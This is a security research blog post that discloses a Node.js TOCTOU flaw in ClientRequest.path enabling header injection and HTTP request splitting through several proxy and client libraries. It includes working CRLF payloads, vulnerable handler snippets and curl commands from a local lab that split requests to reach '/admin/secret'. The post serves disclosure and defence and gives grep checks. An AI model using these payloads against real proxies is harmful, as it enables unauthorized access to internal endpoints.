---
layout: post
title: "The Forgotten Bug: How a Node.js Core Design Flaw Enables HTTP Request Splitting"
date: 2026-02-27T00:14:54+00:00
img_dir: "/assets/2026-02-27-nodejs-toctou"
image:
  path: "/assets/2026-02-27-nodejs-toctou/cover.jpg"
  width: 1200
  height: 633
  alt: "Node.js TOCTOU HTTP Request Splitting"
description: "Deep dive into a TOCTOU vulnerability in Node.js's ClientRequest.path that bypasses CRLF validation and enables Header Injection and HTTP Request Splitting across 7+ major HTTP libraries totaling 160M+ weekly downloads."
categories: [cve]
---
![Cover]({{ page.img_dir | relative_url }}/cover.png) 

---

> **RESPONSIBLE DISCLOSURE NOTICE**
>
> This vulnerability was reported to Node.js through their HackerOne program.
> The Node.js security team has assessed it and determined it is **not a vulnerability under their current threat model**.
> This paper is published to inform the ecosystem and help developers protect their applications.

---

## Table of Contents

1. [Prologue: A Bug That Won't Die](#1-prologue-a-bug-that-wont-die)
2. [The 2018 Precedent: CVE-2018-12116](#2-the-2018-precedent-cve-2018-12116)
3. [The Root Cause: Anatomy of the TOCTOU](#3-the-root-cause-anatomy-of-the-toctou)
4. [Walking Through the Source Code](#4-walking-through-the-source-code)
5. [The Impact Spectrum: From Header Injection to Request Splitting](#5-the-impact-spectrum-from-header-injection-to-request-splitting)
6. [The Ecosystem Audit: 7 Vulnerable Libraries](#6-the-ecosystem-audit-7-vulnerable-libraries)
7. [Library-by-Library Deep Dive](#7-library-by-library-deep-dive)
8. [Libraries That Got It Right](#8-libraries-that-got-it-right)
9. [Live Demo](#9-live-demo)
10. [Node.js Response: "Not a Vulnerability"](#10-nodejs-response-not-a-vulnerability)
11. [Call to Arms](#11-call-to-arms)

---

## 1. Prologue: A Bug That Won't Die

In 2018, a researcher discovered that Node.js's `http.request()` would happily pass Unicode characters through to the wire, where latin1 encoding would truncate them into CRLF bytes — enabling HTTP Request Splitting. It was assigned [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116), scored CVSS 7.5 HIGH, and promptly fixed.

The fix added a regex validation to reject paths containing characters outside `\u0021-\u00ff`:

```javascript
// lib/_http_client.js (the 2018 fix, still present today)
const INVALID_PATH_REGEX = /[^\u0021-\u00ff]/;

if (options.path) {
    const path = String(options.path);
    if (INVALID_PATH_REGEX.test(path)) {
        throw new ERR_UNESCAPED_CHARACTERS('Request path');
    }
}
```

Case closed. Right?

**Not quite.** The 2018 fix has a fundamental design flaw: **it only runs at construction time.** The property it validates — `this.path` — remains a plain writable JavaScript property with no setter, no proxy, no `Object.defineProperty` guard. Any code that mutates `ClientRequest.path` after construction completely bypasses this validation.

And as I discovered, **an enormous amount of code does exactly that.**

---

## 2. The 2018 Precedent: CVE-2018-12116

To understand the current bug, we need to understand its predecessor.

### CVE-2018-12116 — HTTP Request Splitting via Unicode

| Field | Value |
|-------|-------|
| **CVE** | [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116) |
| **CVSS** | 7.5 HIGH |
| **Affected** | Node.js < 6.15.0, < 8.14.0, < 10.14.0, < 11.3.0 |
| **Reporter** | [Arkadiy Tetelman](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) (Lob) |
| **CWE** | CWE-115 (Misinterpretation of Input) |

**The Mechanism:** Node.js versions 8 and below used `latin1` encoding when constructing HTTP requests without a body. Latin1 is a single-byte encoding — it can't represent high Unicode characters, so it *truncates them to their lowest byte*.

An attacker could craft Unicode characters that, when truncated to latin1, produced HTTP control bytes:

- `\u{010D}` → `\x0D` (Carriage Return, `\r`)
- `\u{010A}` → `\x0A` (Line Feed, `\n`)

This meant a path like `"/safe\u{010D}\u{010A}\u{010D}\u{010A}GET /admin"` would pass any ASCII validation, but on the wire would become `"/safe\r\n\r\nGET /admin"` — a fully split second HTTP request.

**The Fix:** Reject any path containing characters outside the range `\u0021-\u00ff` at construction time.

The fix was effective for its specific attack vector. But it introduced an assumption that would prove dangerous: **that validation at construction time is sufficient.**

---

## 3. The Root Cause: Anatomy of the TOCTOU

The vulnerability I found is a classic [TOCTOU (Time-of-Check-Time-of-Use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) bug.

```
              TIME ─────────────────────────────────────────────────────►
    ┌──────────────────┐         ┌─────────────────────┐        ┌──────────────────┐
    │  http.request()  │         │   TOCTOU WINDOW     │        │ _implicitHeader()│
    │                  │         │                     │        │                  │
    │  options.path    │         │  ClientRequest      │        │  this.path used  │
    │  is VALIDATED    │         │  is EXPOSED to      │        │  directly in     │
    │  against         │────────►│  user code via      │───────►│  HTTP request    │
    │  INVALID_PATH_   │         │  events/callbacks   │        │  line — NO       │
    │  REGEX           │         │                     │        │  re-validation   │
    │                  │         │  .path is a PLAIN   │        │                  │
    │  ✅✅ CHECK     │         │  WRITABLE property  │        │  ❌❌ USE       │
    └──────────────────┘         └─────────────────────┘        └──────────────────┘
                                          🡩
                                          |
                                  ┌─────────────────────┐
                                  │  ATTACKER MUTATES   │
                                  │  clientReq.path =   │
                                  │  "/x\r\n\r\nGET /"  │
                                  │                     │
                                  │  Validation is      │
                                  │  NEVER re-run       │
                                  └─────────────────────┘
```

In simple terms:

1. **CHECK**: When you call `http.request(options)`, Node.js validates `options.path` against `INVALID_PATH_REGEX`. If it contains CRLF characters (`\r`, `\n`) or characters outside `\u0021-\u00ff`, it throws an error. Good.

2. **WINDOW**: The resulting `ClientRequest` object has a `.path` property that is a **plain writable JavaScript property** — `this.path = options.path || '/'`. No setter. No `Object.defineProperty`. No `Proxy`. Any code with a reference to the object can write to it freely.

3. **USE**: When the request is actually sent (triggered by `.write()`, `.end()`, or `.pipe()`), the method `_implicitHeader()` reads `this.path` directly and concatenates it into the HTTP request line: `this.method + ' ' + this.path + ' HTTP/1.1\r\n'`. **No re-validation.**

The gap between step 1 and step 3 is the TOCTOU window. Any mutation of `.path` during this window bypasses all CRLF validation.

---

## 4. Walking Through the Source Code

Let's trace exactly what happens in the Node.js source code. All references are to the current Node.js `main` branch at time of writing.

### 4.1 — The Validation (Construction Time)

File: **`lib/_http_client.js`** — [source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L117)

```javascript
// Line 117: The regex that guards against CRLF
const INVALID_PATH_REGEX = /[^\u0021-\u00ff]/;
```

This regex matches any character *outside* the printable latin1 range. Notably, `\r` (`\u000D`) and `\n` (`\u000A`) are **below** `\u0021`, so they are caught by this regex. This is the CVE-2018-12116 fix.

[source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L235-L241)

```javascript
// Lines 235-241: Validation runs ONCE, at construction
if (options.path) {
    const path = String(options.path);
    if (INVALID_PATH_REGEX.test(path)) {
        debug('Path contains unescaped characters: "%s"', path);
        throw new ERR_UNESCAPED_CHARACTERS('Request path');
    }
}
```

So far, so good. CRLF in the constructor path = error thrown.

### 4.2 — The Assignment (No Protection)

[source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L306)

```javascript
// Line 306: Plain property assignment — no setter, no guard
this.path = options.path || '/';
```

This is just a regular JavaScript property. There is no:

- `Object.defineProperty()` with a setter that validates
- `Proxy` trap
- Private field (`#path`)
- Frozen/sealed property

Any code that has a reference to the `ClientRequest` object can do `req.path = anything` and it will succeed silently.

### 4.3 — The Use (No Re-validation)

[source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L475-L481)

```javascript
// Lines 475-481: _implicitHeader() — called by .write(), .end(), .pipe()
ClientRequest.prototype._implicitHeader = function _implicitHeader() {
    if (this._header) {
        throw new ERR_HTTP_HEADERS_SENT('render');
    }
    this._storeHeader(
        this.method + ' ' + this.path + ' HTTP/1.1\r\n',
        //                   ^^^^^^^^^
        //                   READ DIRECTLY — NO RE-VALIDATION
        this[kOutHeaders]
    );
};
```

This is where the damage happens. `this.path` is read raw and concatenated directly into the HTTP request line. If `.path` now contains `\r\n`, those bytes go directly onto the TCP socket.

### 4.4 — The Wire Format

`_storeHeader()` (in `lib/_http_outgoing.js`) takes that first line and builds the complete HTTP message — [source](https://github.com/nodejs/node/blob/main/lib/_http_outgoing.js#L397):

```javascript
// lib/_http_outgoing.js, line 397
function _storeHeader(firstLine, headers) {
    // firstLine = 'GET /index.html HTTP/1.1\r\n'   ← normal
    // firstLine = 'GET /x\r\n\r\nGET /admin HTTP/1.1\r\n'  ← SPLIT!
    const state = {
        // ...
        header: firstLine,   // ← stored directly, no sanitization
    };
    // ... processes headers, appends them to state.header ...
    // ... writes state.header to the socket ...
}
```

The content flows directly to the TCP socket. If the path contained CRLF sequences, they are written as-is — enabling anything from header injection to full request splitting, depending on the payload.

---

## 5. The Impact Spectrum: From Header Injection to Request Splitting

This is not a single attack. Depending on how CRLF characters are injected into `ClientRequest.path`, the impact ranges from header injection to complete request splitting. The `_implicitHeader()` method concatenates the path directly into the request line — so whatever bytes are in `.path`, they go on the wire verbatim.

Here's the full spectrum:

### Level 1: Header Injection

Injecting a single `\r\n` after the HTTP version allows adding arbitrary headers to the outgoing request.

```
Mutated path:  /legit HTTP/1.1\r\nX-Injected: malicious-value\r\nX-Foo: bar

On the wire:
    GET /legit HTTP/1.1
    X-Injected: malicious-value      ← injected
    X-Foo: bar                        ← injected
    Host: backend.internal            ← original headers follow
    Connection: keep-alive
```

**Impact:** Override security headers (`Authorization`, `X-Forwarded-For`, `Host`), bypass IP-based ACLs, impersonate internal services.

### Level 2: Body Injection

Injecting `\r\n` sequences to close the headers and begin a body allows injecting content into a request that wasn't supposed to have a body.

```
Mutated path:  /legit HTTP/1.1\r\nContent-Length: 13\r\n\r\n{"admin":true}

On the wire:
    GET /legit HTTP/1.1
    Content-Length: 13                ← injected
                                      ← end of headers
    {"admin":true}                    ← injected body
    Host: backend.internal            ← orphaned, treated as next request start
```

**Impact:** Transform GET requests into requests with bodies, inject JSON/form payloads, alter backend state.

### Level 3: Full Request Splitting

Injecting a complete `\r\n\r\n` sequence (end of headers) followed by a new request line creates **two completely separate HTTP requests** from a single client request.

```
Mutated path:  /legit HTTP/1.1\r\nHost: x\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n

On the wire — TWO distinct requests:

    ┌─── Request 1 (legitimate) ────────────────┐
    │ GET /legit HTTP/1.1                        │
    │ Host: x                                    │
    │                                            │
    └────────────────────────────────────────────┘
    ┌─── Request 2 (INJECTED) ──────────────────┐
    │ GET /admin HTTP/1.1                        │
    │ Host: x                                    │
    │                                            │
    └────────────────────────────────────────────┘
```

**Impact:** The second request is entirely attacker-controlled — method, path, headers, body. It reaches the backend as a completely independent request. This enables access to internal endpoints, admin panels, or any path the proxy wouldn't normally allow.

### Quick reference

| Level | Payload pattern | What gets injected | Impact |
|-------|----------------|-------------------|--------|
| **Header Injection** | `/path HTTP/1.1\r\nHeader: value` | Arbitrary headers | Auth bypass, SSRF, header overrides |
| **Body Injection** | `/path HTTP/1.1\r\nContent-Length: N\r\n\r\nbody` | Headers + Body | State mutation, privilege escalation |
| **Request Splitting** | `/path HTTP/1.1\r\nHost: x\r\n\r\nGET /new` | Entire second request | Full control of a second independent request |

> **Note:** This is different from HTTP Request Smuggling (CL/TE desync). Smuggling produces one ambiguous request that is interpreted differently by frontend and backend. Request Splitting produces **two distinct, well-formed requests** on the wire from a single client request. The second request is not ambiguous — it's a real, complete HTTP request.

---

## 6. The Ecosystem Audit: 7 Vulnerable Libraries

The TOCTOU window is in Node.js core, but it only becomes exploitable when a library **exposes the raw `ClientRequest` object** to user code (or its own internal code) **between construction and header flush**.

I audited the most popular Node.js HTTP client and proxy libraries to determine which ones open this window. Here are the results:

### Vulnerable Libraries (Window OPEN)

| # | Library | Weekly Downloads | Stars | Window Mechanism |
|---|---------|:----------------:|:-----:|-----------------|
| 1 | **node-http-proxy** | 18.7M | 14.1K | `proxyReq` event on socket callback, before `.pipe()` |
| 2 | **http-proxy-middleware** | 22.6M | 11.1K | Inherits #1 + `pathRewrite` zero sanitization + `fixRequestBody()` flush |
| 3 | **http-proxy-3** | via Vite | — | Fork of #1, identical pattern |
| 4 | **httpxy** | via Nitro | — | Fork of #1, identical pattern |
| 5 | **superagent** | 15.9M | 16K | `emit('request', this)` before `req.end()` |
| 6 | **request** (+forks) | 24.4M | 25.9K | `emit('request', req)` before deferred `.write()`/`.end()` |
| 7 | **@hapi/wreck** | 1.7M | — | `emit('request', req)` + `promise.req` on Stream payloads |

**Combined: ~160M+ weekly downloads with an open TOCTOU window.**

> **Important Note:** This is not an exhaustive list. Any library or custom code that uses `http.request()` and exposes the resulting `ClientRequest` before `_implicitHeader()` is called is potentially affected. The vulnerability surface extends to every custom implementation of HTTP proxying or client code that follows this pattern. There are certainly more libraries out there.

---

## 7. Library-by-Library Deep Dive

### 7.1 — node-http-proxy

> **18.7M downloads/week · 14.1K stars**
>
> The foundation of Node.js proxying. Used by http-proxy-middleware, Vite (via http-proxy-3), Nuxt (via httpxy), webpack-dev-server, BrowserSync, and hundreds of other tools.

**The Window:**

[source](https://github.com/http-party/node-http-proxy/blob/master/lib/http-proxy/passes/web-incoming.js#L126-L135) · [pipe](https://github.com/http-party/node-http-proxy/blob/master/lib/http-proxy/passes/web-incoming.js#L170)

```javascript
// lib/http-proxy/passes/web-incoming.js

// Line 126: ClientRequest created — path validated here
var proxyReq = (options.target.protocol === 'https:' ? https : http).request(
    common.setupOutgoing(options.ssl || {}, options, req)
);

// Lines 131-135: proxyReq event fires on socket callback
proxyReq.on('socket', function(socket) {
    if (server && !proxyReq.getHeader('expect')) {
        server.emit('proxyReq', proxyReq, req, res, options);
        //          ^^^^^^^^^ ClientRequest exposed — WINDOW OPEN
    }
});

// Line 170: .pipe() triggers _implicitHeader() — WINDOW CLOSES
(options.buffer || req).pipe(proxyReq);
```

**Vulnerable Pattern:**

```javascript
const httpProxy = require('http-proxy');
const proxy = httpProxy.createProxyServer({ target: 'http://backend:8080' });

proxy.on('proxyReq', (proxyReq, req, res) => {
    // ANY mutation of proxyReq.path here bypasses CRLF validation
    proxyReq.path = req.url;                              // raw passthrough
    proxyReq.path = proxyReq.path.replace('/prefix', ''); // prefix strip
    proxyReq.path = '/api' + req.query.target;            // concatenation
});
```

The same pattern applies identically to **http-proxy-3** (used by Vite, 78.4K stars) and **httpxy** (used by Nitro/Nuxt, 57K stars). They are forks with the same architecture.

---

### 7.2 — http-proxy-middleware

> **22.6M downloads/week · 11.1K stars**
>
> The most popular Express/Connect proxy middleware. Built on top of node-http-proxy. Used by Create React App, Angular CLI, webpack-dev-server, and countless production applications.

http-proxy-middleware is built on top of node-http-proxy and inherits the same TOCTOU window via the `on.proxyReq` handler. The vulnerable pattern is identical:

**The Window (inherited from node-http-proxy):**

Any code inside `on.proxyReq` that assigns to `proxyReq.path` bypasses CRLF validation, exactly as in node-http-proxy. http-proxy-middleware simply wraps the configuration:

```javascript
createProxyMiddleware({
    target: 'http://backend:8080',
    on: {
        proxyReq: (proxyReq, req, res) => {
            proxyReq.path = userControlledValue;  // ← TOCTOU: same window as node-http-proxy
        }
    }
});
```

**Note on `fixRequestBody()`:**

[source](https://github.com/chimurai/http-proxy-middleware/blob/master/src/handlers/fix-request-body.ts#L30-L32)

```typescript
// src/handlers/fix-request-body.ts, lines 30-32
const writeBody = (bodyData: string) => {
    proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
    proxyReq.write(bodyData);  // ← calls _implicitHeader() IMMEDIATELY
};
```

`fixRequestBody()` does not modify `proxyReq.path` — it only writes the body. However, the `.write()` call triggers `_implicitHeader()`, which flushes whatever is currently in `proxyReq.path` to the wire. If a path mutation happens *before* `fixRequestBody()` in the same handler, the flush is deterministic rather than race-dependent.

---

### 7.3 — superagent

> **15.9M downloads/week · 16K stars**
>
> Popular HTTP client library with a fluent API. Used for both browser and Node.js.

**The Window:**

[source](https://github.com/ladjs/superagent/blob/master/src/node/index.js#L788) · [emit](https://github.com/ladjs/superagent/blob/master/src/node/index.js#L1220) · [end](https://github.com/ladjs/superagent/blob/master/src/node/index.js#L1291)

```javascript
// src/node/index.js

// Line 788:  ClientRequest created — path validated
this.req = module_.request(options);

// Line 1220: 'request' event emitted — WINDOW OPEN
this.emit('request', this);
// this.req is accessible via the emitted 'this' object

// Line 1291: req.end() called — _implicitHeader() — WINDOW CLOSES
req.end(data);
```

**Vulnerable Pattern:**

```javascript
const superagent = require('superagent');

superagent.get('http://target.com/safe')
    .on('request', (sa) => {
        // sa.req is the raw ClientRequest
        // _implicitHeader() has NOT been called yet
        sa.req.path = '/safe HTTP/1.1\r\nHost: x\r\n\r\nGET /admin';
    })
    .end();
```

While this pattern is less common than proxy path mutations (superagent is typically used as a client, not a proxy), the architectural window is present and any code using the `request` event to modify the underlying `ClientRequest` would be vulnerable.

---

### 7.4 — request (+ @cypress/request, postman-request)

> **24.4M combined downloads/week · 25.9K stars**
>
> Deprecated since 2020 but still massively used. Its forks (@cypress/request, postman-request) are actively maintained.

**The Window:**

[source](https://github.com/request/request/blob/master/request.js#L751) · [emit](https://github.com/request/request/blob/master/request.js#L861)

```javascript
// request.js

// Line 751: ClientRequest created — path validated
self.req = self.httpModule.request(reqOptions);

// Line 861: 'request' event emitted — WINDOW OPEN
self.emit('request', self.req);

// ... start() returns ...

// Deferred via setImmediate/nextTick:
// self.write() / self.end()   ← _implicitHeader() — WINDOW CLOSES
```

The key insight here is the **deferred execution**: `.write()` and `.end()` are scheduled via `setImmediate`/`nextTick`, so they run *after* `start()` returns. The `'request'` event fires synchronously inside `start()`, giving handler code full access to the `ClientRequest` before any data is sent.

**Vulnerable Pattern:**

```javascript
const request = require('request');  // or @cypress/request, postman-request

request('http://target.com/safe')
    .on('request', (clientReq) => {
        // clientReq is the raw ClientRequest
        // .write()/.end() are DEFERRED — haven't run yet
        clientReq.path = '/safe HTTP/1.1\r\nHost: x\r\n\r\nGET /admin';
    });
```

| Fork | Weekly Downloads | Status |
|------|:----------------:|--------|
| **request/request** | 14.7M | Deprecated, same TOCTOU window |
| **@cypress/request** | 7.5M | Active fork, same codebase |
| **postman-request** | 2.2M | Active fork, same codebase |

---

### 7.5 — @hapi/wreck

> **1.7M downloads/week**
>
> The core HTTP client for the Hapi ecosystem. Used in enterprise applications at Walmart, Yahoo, and Mozilla.

**Two distinct vectors:**

**Vector 1 — `'request'` event:**

[source](https://github.com/hapijs/wreck/blob/master/lib/index.js#L186-L188)

```javascript
// lib/index.js

// Line 186: ClientRequest created — path validated
const req = client.request(uri);

// Line 188: 'request' event emitted — WINDOW OPEN
this._emit('request', req);

// Later: req.write(payload) / req.end()  — WINDOW CLOSES
```

**Vector 2 — Stream payload (deferred pipe):**

[source](https://github.com/hapijs/wreck/blob/master/lib/index.js#L316-L331)

```javascript
// lib/index.js, lines 316-331
if (options.payload instanceof Stream) {
    internals.deferPipeUntilSocketConnects(req, stream);
    return req;   // ← returns WITHOUT calling .end()!
}

// The returned req is stored in:
promise.req = req;   // ← accessible before _implicitHeader()
```

When the payload is a `Stream`, wreck defers the pipe until the socket connects. This means `promise.req` is exposed *before* `_implicitHeader()` runs, giving calling code time to mutate `.path`.

**Vulnerable Patterns:**

```javascript
const Wreck = require('@hapi/wreck');

// Vector 1: via events
const client = Wreck.defaults({ events: true });
client.events.on('request', (req) => {
    req.path = '/admin\r\nHost: evil\r\n\r\nGET /secret';
});
await client.get('http://target.com/safe');

// Vector 2: via Stream payload
const { Readable } = require('stream');
const stream = new Readable({ read() { this.push('data'); this.push(null); } });
const promise = Wreck.request('POST', 'http://target.com/safe', { payload: stream });
promise.req.path = '/admin\r\nHost: evil\r\n\r\nPOST /secret';
```

---

## 8. Libraries That Got It Right

Not every library is affected. Several popular HTTP libraries have architectures that naturally close the TOCTOU window, either by accident or by design.

| Library | Weekly Downloads | Why It's Safe |
|---------|:---------------:|---------------|
| **follow-redirects** | 77.7M | `._currentRequest` is private — never exposed via public API |
| **axios** | 45M | Uses follow-redirects internally — no raw `ClientRequest` exposure |
| **undici / fetch()** | 30M+ | Does not use `ClientRequest` at all — entirely different HTTP stack |
| **got** | 24M | Calls `._sendBody()` **BEFORE** emitting `'request'` — headers already flushed |
| **needle** | 3M | Calls `.end()` **BEFORE** exposing `out.request` to user code |
| **phin / centra** | 1.9M | `req.end()` synchronous in same Promise executor — `req` never exposed |
| **@fastify/reply-from** | 1.5M | Uses `new URL()` (WHATWG) which percent-encodes CRLF characters |
| **express-http-proxy** | 350K | Calls `http.request()` directly with clean options — no post-mutation |
| **h3 `proxyRequest()`** | via Nitro | Uses `fetch()` API, not `http.request()` — independent CRLF validation |

### What Makes a Library Safe?

The pattern is clear. Safe libraries follow one of these strategies:

**1. Flush before expose** — Call `.write()`, `.end()`, or `.pipe()` *before* emitting events or returning the `ClientRequest` to user code. (`got`, `needle`, `phin`)

**2. Never expose** — Keep the `ClientRequest` as a private/local variable. Never emit it via events or return it before headers are sent. (`follow-redirects`, `axios`)

**3. Don't use `ClientRequest`** — Use `fetch()`, `undici`, or another HTTP implementation that doesn't have this writable `.path` property. (`h3`, `undici`)

**4. Encode at construction** — Use `new URL()` (WHATWG parser) which percent-encodes special characters before they ever reach `http.request()`. (`@fastify/reply-from`)

---

## 9. Live Demo

To demonstrate this vulnerability in practice, I set up a minimal but realistic lab: a proxy that rewrites paths using the most common pattern found in real-world code, and a backend that logs every request it receives.

<!-- [TODO: INSERT VIDEO/GIF HERE] -->

### The Setup

**Backend** (`backend.js`) — a simple Express server that logs every incoming request:

```javascript
const express = require("express");

const app = express();
app.use(express.json());
r_idx = 0;

app.get("*", (req, res) => {
  console.log(`[${++r_idx}] ${req.method} ${req.path}`);
  res.json({
    ok: true,
    source: "target-server",
    method: req.method,
    url: req.originalUrl,
    path: req.path,
    query: req.query,
    headers: {
      host: req.headers.host,
      "x-proxy-test": req.headers["x-proxy-test"] || null,
    },
  });
});

app.post("*", (req, res) => {
  console.log(`[${++r_idx}] ${req.method} ${req.path}`);
  res.json({
    ok: true,
    source: "target-server",
    method: req.method,
    url: req.originalUrl,
    path: req.path,
    query: req.query,
    body: req.body,
    headers: {
      host: req.headers.host,
      "x-proxy-test": req.headers["x-proxy-test"] || null,
    },
  });
});

app.listen(4000, () => {
  console.log("Target server running on http://localhost:4000");
});
```

**Proxy** (`proxy.js`) — an Express proxy that extracts a catch-all parameter and assigns it to `proxyReq.path`:

```javascript
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/proxy/:target(*)', createProxyMiddleware({
  target: 'http://backend:4000',
  changeOrigin: true,
  on: {
    proxyReq: (proxyReq, req) => {
      proxyReq.path = '/' + req.params.target;
      console.log(`[PROXY] ${req.method} ${req.originalUrl} -> ${proxyReq.path}`);
    }
  }
}));

app.listen(3000, '0.0.0.0', () => {
  console.log('Proxy running on http://0.0.0.0:3000');
  console.log('  Example: /proxy/hello');
});
```

This is a completely realistic pattern. The proxy takes a path from the URL (`:target` parameter), prepends `/`, and assigns it to `proxyReq.path`. This is exactly how dozens of real-world proxies handle path rewriting.

The problem: `req.params.target` comes directly from the user's URL. Express decodes percent-encoded characters in route parameters. So `%0D%0A` in the URL becomes `\r\n` in `req.params.target`, which then flows into `proxyReq.path` — **after** `INVALID_PATH_REGEX` validation has already passed.

### Exploit: Header Injection

A single request with percent-encoded CRLF in the path:

```bash
curl "http://localhost:3000/proxy/hello%20HTTP/1.1%0D%0AX-Injected:%20true%0D%0AHost:%20evil.com%0D%0A%0D%0A"
```

The proxy decodes this and assigns to `proxyReq.path`:

```
/hello HTTP/1.1\r\nX-Injected: true\r\nHost: evil.com\r\n\r\n
```

The backend receives a request with the injected `X-Injected` header and a spoofed `Host`.

### Exploit: Full Request Splitting

```bash
curl "http://localhost:3000/proxy/hello%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0AGET%20/admin/secret%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0A"
```

The proxy sends **one** request. The backend logs **two**:

```
[1] GET /hello
[2] GET /admin/secret    ← this was never requested by the client
```

One curl command, two backend requests. The second request (`GET /admin/secret`) is entirely attacker-controlled and reaches the backend as an independent, authenticated request on the same TCP connection.

![live_demo]({{ page.img_dir | relative_url }}/demo.gif) 

---

## 10. Node.js Response: "Not a Vulnerability"

I reported this finding to the Node.js security team through their [HackerOne program](https://hackerone.com/nodejs), providing:

- Full root cause analysis with source code references
- Working proof of concept
- Ecosystem impact assessment showing 7 vulnerable libraries with 160M+ combined weekly downloads
- 13 confirmed real-world production sinks

Their response:

> *"We have assessed it and it's not a vulnerability according our current threat model. In 2018 we did not have one, and if we did we would not have classified that as a vulnerability."*

This references CVE-2018-12116 — the same class of vulnerability, but exploitable directly at the constructor level (via Unicode truncation). The Node.js team's position is that:

1. The 2018 constructor-level fix was not a vulnerability under their current threat model either
2. `ClientRequest.path` being a writable property is by design
3. Libraries that expose the raw `ClientRequest` to user code are responsible for their own validation

While I respect the Node.js team's right to define their threat model, I disagree with this assessment for several reasons:

- **The validation exists but is incomplete.** Node.js *does* validate `options.path` at construction — this creates a false sense of security. Developers reasonably assume that if CRLF in the constructor throws an error, the property is somehow protected.

- **The fix would be trivial.** A setter on `.path` that re-runs `INVALID_PATH_REGEX`, or using `Object.defineProperty` to make it read-only after construction, would close the window without breaking any legitimate use case.

- **The blast radius is massive.** 160M+ weekly downloads across 7 libraries, with confirmed sinks in production projects by Microsoft, Google, Stanford, and UN/FAO. This is not a theoretical concern.

---

## 11. Call to Arms

Since Node.js has decided not to fix the root cause, **the burden falls on the ecosystem.**

Every library that uses `http.request()` and exposes the resulting `ClientRequest` before `_implicitHeader()` is called creates a potential TOCTOU window. Every application that mutates `ClientRequest.path` in that window with user-controlled data is a potential HTTP Request Splitting vulnerability.

### What I'm Looking For

I am actively looking for:

1. **Other HTTP libraries with open TOCTOU windows.** The seven I found are certainly not all of them. Any library that wraps `http.request()` and exposes the `ClientRequest` via events, callbacks, or return values before header flush could be affected.

2. **Applications that mutate `ClientRequest.path`** in event handlers (`proxyReq`, `request`, etc.) with data derived from user input — query parameters, headers, URL paths.

3. **Custom `http.request()` implementations** in production applications that follow the same pattern of exposing `ClientRequest` before flush.

### How to Check Your Code

Search your codebase for these patterns:

```bash
# Proxy libraries (node-http-proxy, http-proxy-middleware)
grep -rn "proxyReq\.path\s*=" .
grep -rn "\.on.*proxyReq" .

# HTTP clients (superagent, request)
grep -rn "\.on.*'request'" . | grep -i "\.path\s*="
grep -rn "\.req\.path\s*=" .

# Generic — any ClientRequest mutation
grep -rn "clientReq\.path\s*=" .
grep -rn "\.path\s*=.*req\." .
```

If you find matches, check whether:

1. The value assigned to `.path` can be influenced by user input (query params, headers, URL segments)
2. The mutation happens after `http.request()` construction but before `.write()`/`.end()`/`.pipe()`

If both conditions are true, you likely have a request splitting vulnerability.

### Collaborate

If you discover vulnerable patterns in libraries or applications, I'd love to hear from you. I believe that community-driven security research is the most effective way to address systemic issues like this — especially when the upstream vendor has decided not to act.

You can reach me at:

- **GitHub:** [@r3verii](https://github.com/r3verii)
- **Email:** [r3verii2@gmail.com](mailto:tuoemail@dominio.com)
- **Linkedin:** [Martino Spagnuolo](https://www.linkedin.com/in/martino-spagnuolo/)

This is an open invitation. Whether you're a security researcher, a library maintainer, or a developer who found this pattern in your own code — let's work together to map and mitigate this vulnerability across the Node.js ecosystem.

---

### Research Timeline

| Date | Milestone |
|------|-----------|
| Feb 2026 | Root cause discovery and initial PoC |
| Feb 2026 | HackerOne report submitted to Node.js |
| Feb 2026 | Node.js response: "not a vulnerability" |
| Feb 2026 | Ecosystem audit: 7 libraries, 160M+ downloads/week |
| Feb 2026 | Part 1 published (this paper) |
| TBD | Part 2: Confirmed vulnerable applications |

---

*This research was conducted with the assistance of AI for code analysis and for drafting the final paper. All findings were reported responsibly prior to public disclosure. No production systems were exploited during this research; all tests were performed on local instances of the affected software.*
